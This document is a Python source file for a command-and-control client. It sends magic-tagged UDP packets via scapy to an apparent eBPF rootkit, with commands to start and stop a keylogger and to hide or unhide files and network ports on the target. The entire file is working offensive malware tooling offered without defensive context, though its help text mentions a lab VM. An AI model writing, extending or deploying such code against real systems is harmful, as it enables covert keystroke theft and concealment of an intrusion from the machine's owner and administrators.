import argparse
import struct
from scapy.all import IP, UDP, send, raw

MAGIC = 0xABCDABCD
MAX_NAME_LEN = 32

# Map command names to opcodes and expected argument types
# Type options: "none", "string", "int"
COMMAND_MAP = {
    "keylogger_start":  {"opcode": 0, "type": "none"},
    "keylogger_stop":   {"opcode": 1, "type": "none"},
    "hide_file":   {"opcode": 2, "type": "string"},
    "unhide_file":   {"opcode": 3, "type": "string"},
    "hide_port":   {"opcode": 4, "type": "int"},
    "unhide_port":   {"opcode": 5, "type": "int"},
}

def build_payload(cmd_name: str, raw_arg: str | None) -> bytes:
    cmd_info = COMMAND_MAP[cmd_name]
    opcode = cmd_info["opcode"]
    arg_type = cmd_info["type"]

    arg_val = 0
    data_bytes = b"\x00" * MAX_NAME_LEN

    if arg_type == "none":
        # Leave arg=0 and data as null bytes
        pass

    elif arg_type == "string":
        if not raw_arg:
            raise ValueError(f"Command '{cmd_name}' requires a string argument (e.g., filename).")
        # Pack the user-provided string directly into command->data
        data_bytes = raw_arg.encode("utf-8")[:MAX_NAME_LEN].ljust(MAX_NAME_LEN, b"\x00")

    elif arg_type == "int":
        if not raw_arg:
            raise ValueError(f"Command '{cmd_name}' requires an integer argument (e.g., port number).")
        arg_val = int(raw_arg, 0)

    # C struct layout: u32 magic, u32 opcode, u32 arg, char data[MAX_NAME_LEN]
    fmt = f"<III{MAX_NAME_LEN}s"
    return struct.pack(fmt, MAGIC, opcode, arg_val, data_bytes)

def main():
    parser = argparse.ArgumentParser(description="eBPF UDP Command Controller")
    parser.add_argument("ip", help="Target UTM Linux VM IP address")
    parser.add_argument("command", choices=COMMAND_MAP.keys(), help="Command name")
    parser.add_argument("arg", nargs="?", default=None, help="Argument (filename or port)")
    
    parser.add_argument("-i", "--iface", default=None, help="Optional network interface (e.g., en0)")
    parser.add_argument("--dport", type=int, default=12345, help="Destination UDP port")

    args = parser.parse_args()

    try:
        payload = build_payload(args.command, args.arg)
        print("Hex payload:", payload.hex(" "))
    except ValueError as e:
        parser.error(str(e))

    # Construct Layer 3 Packet (macOS handles ARP/Ethernet resolution)
    pkt = IP(dst=args.ip) / UDP(sport=54321, dport=args.dport) / payload

    # Re-serialize to force Scapy to generate valid IP/UDP checksums
    raw_pkt = IP(raw(pkt))

    # Send using Layer 3 socket
    if args.iface:
        send(raw_pkt, iface=args.iface, verbose=False)
    else:
        send(raw_pkt, verbose=False)

    print(f"[+] Sent '{args.command}' (Opcode {COMMAND_MAP[args.command]['opcode']}) to {args.ip}:{args.dport}")

if __name__ == "__main__":
    main()